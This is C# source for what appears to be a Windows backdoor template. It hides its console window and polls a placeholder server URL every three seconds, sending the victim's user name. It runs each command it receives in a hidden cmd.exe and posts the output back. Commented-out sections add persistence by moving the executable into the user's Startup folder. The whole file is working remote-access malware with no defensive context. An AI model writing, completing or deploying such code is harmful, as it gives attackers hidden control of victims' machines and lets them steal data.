using System;
using System.Net;
using System.Threading;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Text;
class Program {
  public static string http_post(string URI, string myParameters){
    using (WebClient wc = new WebClient()){
        wc.Headers[HttpRequestHeader.ContentType] = "application/x-www-form-urlencoded";
        return wc.UploadString(URI, myParameters);
    }
  }
  public static string execodec(string command) {
      System.Diagnostics.Process pro = new System.Diagnostics.Process();
      pro.StartInfo.FileName = "cmd.exe";
      pro.StartInfo.UseShellExecute = false;
      pro.StartInfo.RedirectStandardError = true;
      pro.StartInfo.RedirectStandardInput = true;
      pro.StartInfo.RedirectStandardOutput = true;
      pro.StartInfo.CreateNoWindow = true;
      pro.Start();
      pro.StandardInput.WriteLine(command);
      pro.StandardInput.WriteLine("exit");
      pro.StandardInput.AutoFlush = true;
      string output = pro.StandardOutput.ReadToEnd();
      pro.WaitForExit ();
      pro.Close();
      return output;
  }
  public static string Base64Encode(string plainText) {
    var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
    return System.Convert.ToBase64String(plainTextBytes);
  }
  [DllImport("kernel32.dll")]
  static extern IntPtr GetConsoleWindow();
  [DllImport("user32.dll")]
  static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
  const int SW_HIDE = 0;
  const int SW_SHOW = 5;
  public static int Main(string[] args){
    var httpmost = "<URLCP>";
    ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls;
    var handle = GetConsoleWindow();
    ShowWindow(handle, SW_HIDE);
/*firs code
    using (WebClient client = new WebClient()){
      string frstcmd = "<FRSCMD>";
      string backuot = execodec(getcommand);
      http_post(httpmost, "res="+backuot);
    }
end firs code*/
string user_name = System.Environment.UserName;
/*auto run
    try{
      string exe_name = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
      string sourceFile = @"" + exe_name;
      string destinationFile = @"C:\Users\" + user_name + @"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\<FEXENAME>";
      System.IO.File.Move(sourceFile, destinationFile);
    }catch { }
end auto run*/

    while(true){
      using (WebClient client = new WebClient()){
        string getcommand = client.DownloadString(httpmost+"?get=cmd&user_name="+user_name).Replace("\n", "");
        if(getcommand != "0"){
          string backuot = execodec(getcommand);
          http_post(httpmost, "res="+backuot);
        }
      }
      Thread.Sleep(3000);
    }
  }
}
